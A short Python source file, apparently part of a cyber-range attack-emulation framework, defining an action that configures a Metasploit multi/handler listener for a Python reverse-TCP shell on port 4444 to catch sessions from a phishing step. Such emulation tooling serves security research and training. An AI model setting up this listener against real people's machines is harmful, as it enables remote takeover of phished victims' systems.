from cyst.api.logic.metadata import Metadata
from cyst_models.cryton.actions.action import Action


class WaitForSession(Action):
    def __init__(self, message_id: int, metadata: Metadata):
        template = {
            "name": f"phishing-response-{message_id}",
            "step_type": "worker/execute",
            "arguments": {
                "module": "mod_msf",
                "module_arguments": {
                    "module_type": "exploit",
                    "module": "multi/handler",
                    "session_target": "",
                    "module_options": {},
                    "payload": "python/shell_reverse_tcp",
                    "payload_options": {
                        "LHOST": "0.0.0.0",
                        "LPORT": 4444
                    }
                }
            }
        }
        super().__init__(message_id, metadata, template)
